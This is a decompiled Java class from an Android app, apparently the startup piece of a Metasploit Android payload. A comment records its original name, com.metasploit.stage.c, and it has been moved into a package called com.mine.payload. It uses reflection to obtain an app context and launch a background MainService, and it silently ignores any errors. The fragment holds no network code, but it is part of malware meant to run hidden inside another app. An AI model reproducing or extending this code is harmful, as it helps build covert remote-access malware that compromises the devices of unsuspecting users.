package com.mine.payload;

import android.content.Context;
import java.lang.reflect.Method;

/* renamed from: com.metasploit.stage.c */
final class RunnableC0002c implements Runnable {

    /* renamed from: a */
    private /* synthetic */ Method f13a;

    RunnableC0002c(Method method) {
        this.f13a = method;
    }

    public final void run() {
        try {
            Context context = (Context) this.f13a.invoke(null, null);
            if (context != null) {
                MainService.startService(context);
            }
        } catch (Exception e) {
        }
    }
}
